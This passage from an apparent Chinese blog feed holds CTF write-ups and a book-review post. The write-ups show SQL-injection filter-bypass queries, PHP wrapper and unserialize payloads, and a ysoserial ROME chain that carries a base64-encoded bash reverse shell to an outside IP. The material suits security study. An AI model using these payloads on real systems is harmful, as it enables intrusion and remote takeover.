'Flag'</span><br></pre></td></tr></table></figure><p>查询Flag表中的列名信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag'</span><br></pre></td></tr></table></figure><h4 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h4><p>查询指定数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your password is 'flag&#123;fa4954aa-49af-4e07-adc4-74a1260cbb21&#125;'</span><br></pre></td></tr></table></figure><p><code>flag</code>为<code>flag{fa4954aa-49af-4e07-adc4-74a1260cbb21}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Ctf sql注入学习&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019-Web-逆转思维 WriteUp</title>
    <link href="elssm.github.io/2022/12/06/2019-Web-%E9%80%86%E8%BD%AC%E6%80%9D%E7%BB%B4-WriteUp/"/>
    <id>elssm.github.io/2022/12/06/2019-Web-逆转思维-WriteUp/</id>
    <published>2022-12-06T06:36:29.000Z</published>
    <updated>2022-12-06T06:39:17.328Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>题目地址</p><p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p><p>浙江省大学生网络与信息安全竞赛-决赛-2019-Web-逆转思维</p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>进入首页<code>php</code>代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>get</code>请求接收三个参数，第一个if判断成立可以通过<code>data</code>协议</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><p><img src="/2022/12/06/2019-Web-逆转思维-WriteUp/1.png" alt="1"></p><p>第二个if判断不能包含<code>flag</code>字符，因此我们可以先通过<code>php://filter</code>协议获取<code>useless.php</code>文件源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>得到<code>base64</code>编码文件如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure><p>解密后获取<code>useless.php</code>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于<code>password</code>的传值，通过构造<code>flag.php</code>的序列化，让<code>password</code>等于<code>flag.php</code>的序列化输出就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$flag = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到的结果为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>最终<code>get</code>请求参数为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p><img src="/2022/12/06/2019-Web-逆转思维-WriteUp/2.png" alt="2"></p><p>flag为<code>ctfhub{19a6a30e7f1e76f5a60dc63c}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;题目地址&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/challenge&quot; target=&quot;_blan
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ThinkJava CTF WriteUp</title>
    <link href="elssm.github.io/2022/12/04/ThinkJava-CTF-WriteUp/"/>
    <id>elssm.github.io/2022/12/04/ThinkJava-CTF-WriteUp/</id>
    <published>2022-12-04T08:22:10.000Z</published>
    <updated>2022-12-04T08:27:17.873Z</updated>
    
    <content type="html"><![CDATA[<h4 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h4><p><a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">https://www.ctfhub.com/#/challenge</a></p><h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h4><p>下载文件后idea查看，存在地址/common/test/sqlDict</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/1.png" alt="1"></p><p>sqlDict中存在sql注入</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/2.png" alt="2"></p><p>获取用户名和密码</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/3.png" alt="3"></p><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>代码中发现引入了swagger</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/4.png" alt="4"></p><p>登陆swagger</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/5.png" alt="5"></p><p>存在登陆接口，根据sql注入得到的用户名和密码进行登录</p><p>resp中返回了base64的auth头</p><p>将base64的auth头放入/common/user/current接口中的</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/6.png" alt="6"></p><p>可以得到用户名</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>从rO0AB特征可以看到是java的序列化后的base64编码</p><p>构造反弹shell</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/7.png" alt="7"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % java -jar ysoserial-all.jar ROME "bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTg4LjE1OC84MDgwIDA+JjE&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;" |base64</span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAb0yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAYGJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1ERXVORE11TVRnNExqRTFPQzg0TURnd0lEQStKakV9fHtiYXNlNjQsLWR9fHtiYXNoLC1pfQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjMzODk5NDk5ODQyMDQyAQAfTHlzb3NlcmlhbC9Qd25lcjMzODk5NDk5ODQyMDQyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AFwAAAdTK/rq+AAAAMgAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAA8AA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAEUHducnB3AQB4c3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLkVxdWFsc0JlYW71ihi75fYYEQIAAkwACl9iZWFuQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wABF9vYmpxAH4ACXhwdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHEAfgAUc3IAKmNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLlRvU3RyaW5nQmVhbgn1jkoPI+4xAgACTAAKX2JlYW5DbGFzc3EAfgAcTAAEX2</span><br></pre></td></tr></table></figure><p>服务器启动监听端口</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/8.png" alt="8"></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>获取flag</p><p><img src="/2022/12/04/ThinkJava-CTF-WriteUp/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;题目地址&quot;&gt;&lt;a href=&quot;#题目地址&quot; class=&quot;headerlink&quot; title=&quot;题目地址&quot;&gt;&lt;/a&gt;题目地址&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/challenge&quot; target=&quot;_blank&quot; r
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>读书分享I</title>
    <link href="elssm.github.io/2022/12/04/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABI/"/>
    <id>elssm.github.io/2022/12/04/读书分享I/</id>
    <published>2022-12-04T06:22:48.000Z</published>
    <updated>2022-12-14T06:01:36.945Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>研三上学期我的时间几乎每天被分成了几大块。睡觉吃饭、健身、读书、毕设、吉他，目的是让学生时代最后过的有意义些。健身时间我基本上固定到了每天中午的11:40到13:00，一周大概4天或者5天。读书我一般固定在周内的中午和晚上睡觉前，周末时间就不固定了。目前这种状态大概持续了3个月。正好做一个简单的阅读分享。</p><h4 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h4><ul><li>网络是怎样连接的（户根勤）</li></ul><p><img src="/2022/12/04/读书分享I/1.png" alt="1" style="zoom:50%;"></p><p>身为计算机专业的学生，经常被问到如下一个关于网络的问题。</p><p>面试官：我现在在浏览器里输入一个地址，请你简述一下从回车之后到响应发生的大概流程。</p><p>该书完美解答了这个问题，读完这本书，我相信对于面试官的这个问题至少可以回答40分钟。书中的配图也很详细很直观。</p><ul><li>1984（乔治奥威尔）</li></ul><p><img src="/2022/12/04/读书分享I/2.png" alt="2" style="zoom:50%;"></p><p><strong>战争即和平、自由即奴役、无知即力量。</strong></p><p>《1984》是一部杰出的政治寓言小说，也是一部幻想小说。作品刻画了人类在极权主义社会的生存状态，有若一个永不褪色的警示标签，警醒世人提防这种预想中的黑暗成为现实。历经几十年，其生命力益显强大，被誉为20世纪影响最为深远的文学经典之一。</p><p>如果生活像1984这样，那人生还有什么意义。温斯顿这样的人物，最终都被强制“驯化”了。这本书读到一半的时候我还以为奥伯良是个好人，没想到太坏了。我有理由相信奥伯良或许之前也是和温斯顿一样的想法，只不过奥伯良受到的“洗脑”更严重，从而导致他完成了从痛恨老大哥到崇拜老大哥的转变。真是细思极恐！</p><ul><li>局外人（加缪）</li></ul><p><img src="/2022/12/04/读书分享I/3.png" alt="3" style="zoom:50%;"></p><p><strong>人生在世，永远也不该演戏作假。</strong></p><p>《局外人》是法国作家加缪的成名作，同时也是存在主义文学的杰出作品之一，该书以一种客观记录式的“零度风格”，粗线条地描述了主人公默尔索在荒谬的世界中经历的种种荒谬的事，以及自身的荒诞体验。从参加母亲的葬礼到偶然成了杀人犯，再到被判处死刑，默尔索似乎对一切都无动于衷，他像一个象征性的符号，代表了一种普遍的存在，又像是一个血红色的灯塔，具有高度的警示性。然而，局外人现象的产生无疑是由这个世界本身所孕育的，默尔索的存在有其深刻的外部原因。</p><p>看完局外人后，我很欣赏默尔索这个人物，特立独行，不悲不喜。然而就是这样的一个性格，最后竟然成为了在法庭上被审判的点，我相信世界上像默尔索这样的人寥寥无几。对于他的遭遇我也感到惋惜。</p><ul><li>刀锋（毛姆）</li></ul><p><img src="/2022/12/04/读书分享I/4.png" alt="4" style="zoom:50%;"></p><p><strong>剃刀边缘无比锋利，欲通过者无不艰辛。是故智者常言，救赎之道难行。</strong></p><p>《刀锋》写一个参加第一次世界大战的美国青年飞行员拉里·达雷尔。在军队里，拉里结识了一个爱尔兰好友：这人平时是那样一个生龙活虎般的置生死于度外的飞行员，但在一次遭遇战中，因去救拉里而中弹牺牲。拉里因此对人生感到迷惘，弄不懂世界上为什么有恶和不幸，拉里开始了他令人匪夷所思的转变。</p><p>这本书中的人物刻画非常鲜明，例如艾略特舅舅、伊莎贝尔、布雷德利太太、拉里、格雷、苏菲、苏珊等。其实除了主人公拉里意外，其他人物都写的很好。艾略特，一辈子喜欢交际、喜欢人情世故。但是有一颗善良的心。刚开始看的时候我觉得这样的人活着属实有些累，但是看到最后，我逐渐理解了艾略特。伊莎贝尔，曾经是拉里的未婚妻，说实话书的前面我很欣赏伊莎贝尔，感觉这种女的真是不可多得。一般人都不能理解拉里，但是她却能够一直陪伴拉里。好家伙没想到后面反转了，陷害苏菲(当然苏菲也有自身原因)，之后我就不喜欢这个人物了。苏珊，我觉得活的很真实，也很清楚自己想要什么，当然苏珊的日子最后也过的很舒服。随遇而安就是最好的！</p><ul><li>人生（路遥）</li></ul><p><img src="/2022/12/04/读书分享I/5.png" alt="5" style="zoom:50%;"></p><p><strong>人生的道路虽然漫长，但紧要处常常只有几步，特别是当人年轻的时候。</strong></p><p>《人生》是路遥的一部中篇小说，发表于1982年，它以改革时期陕北高原的城乡生活为时空背景，叙述了高中毕业生高加林回到土地又离开土地，再回到土地这样人生的变化过程。高加林同农村姑娘刘巧珍、城市姑娘黄亚萍之间的感情纠葛构成了故事发展的矛盾，也正是体现那种艰难选择的悲剧。</p><p>对于高加林的遭遇我很共情，当一家三口得知高加林教师职位被撤去之后，我想到了自己当时得知自己考研复试被刷后的情形。吃不下去饭，看不进去书，听不进去话。浑浑噩噩过了两周，当时都想过二战，但是又没有足够的勇气与毅力，最终还是选择了调剂。对于高加林的意志我感到佩服，在农村那样的环境下，能够一直坚持，没有颓废下去。</p><p>但是我觉得高加林的欲望太大了。巧珍多好的姑娘，现在打灯笼都找不着！你高加林失落的时候是谁在陪你，你高加林锄地受伤的时候是谁给你抹的药，你高加林馒头卖不出去的时候是谁帮的你。你高加林倒好，为了自己的未来直接抛弃巧珍要和黄亚萍在一起。太年轻了，too young too simple！亚萍也是急，被爱情冲昏了头脑，我看人张克南就不错嘛。</p><ul><li>我的阿勒泰（李娟）</li></ul><p><img src="/2022/12/04/读书分享I/6.jpeg" alt="6" style="zoom:50%;"></p><p><strong>最安静与最孤独的成长，也是能使人踏实、自信、强大、善良的。大不了，吐吐舌头而已。</strong></p><p>李娟的散文成名作和代表作之一。原生态记录了作者在疆北阿勒泰地区生活的点点滴滴，包括人与事的记忆和感悟。全书文字明净，质地纯粹，原生态地再现了疆北风物人情，充满了朴野清新的气息。十年前，作者在到处收集来的纸片上用密密麻麻的文字写下她的生活和感悟，投稿到新疆的文艺期刊。一些资深的编辑认为一个二十岁左右的女孩不可能写出如此清新而有才华的作品。但新疆著名作家刘亮程将她挖掘出来，她的*部作品以《九篇雪》为名结集出版，人们才开始知道有个新疆女孩叫李娟。此后，她的散文在《南方周末》、《文汇报》陆续刊登，完全是天才的笔触，引起了文坛的震惊。人们很难想象：一个没有受过完整高等教育、阅读范围主要限于金庸、琼瑶、一直生活在疆北荒野之地的女孩，能够写出如此清新、活泼、充满灵性和生命力的文字。</p><p>书中讲述了一个一个的小故事，很善良很温馨。看完之后我发现李娟的童年很充实，卖货踩缝纫机摘蘑菇哈哈哈哈哈，希望后面有机会也能去新疆玩一玩！</p><ul><li>我与地坛（史铁生）</li></ul><p><img src="/2022/12/04/读书分享I/7.jpeg" alt="7" style="zoom:50%;"></p><p><strong>只要还能哭就还有救，只要还能哭就有哭够的时候。</strong></p><p>《我与地坛》由中国当代著名作家史铁生著。是史铁生文学作品中，充满哲思又极为人性化的代表作之一。其前第一段和第二段被纳入人民教育出版社的高一教材中。前两部分注重讲地坛和他与母亲的后悔，对于中学生来说，这是一篇令人反思的优秀文章。</p><p>史铁生的文笔真是太细腻了～～～</p><ul><li>都柏林人（詹姆斯乔伊斯）</li></ul><p><img src="/2022/12/04/读书分享I/8.png" alt="8" style="zoom:50%;"></p><p>《都柏林人》是詹姆斯·乔伊斯久负盛名的短篇小说集，称得上20世纪整个西方最著名的短篇小说集了。1914年出版，置景于二三十年代的都柏林，截取中下层人民生活的横断面，一个片刻一群人，十五个故事汇集起来，宛若一幅印象主义的绘画，笔触简练，错落成篇，浮现出苍凉世态，遥远、清冷，然而精致，是上上之品。</p><p>故事的构成很精心，应该都是些开放式的结尾吧，印象比较深刻的故事是母亲、两个浪汉和公寓。</p>]]></content>
    
    <summary type="html">
    
      
      
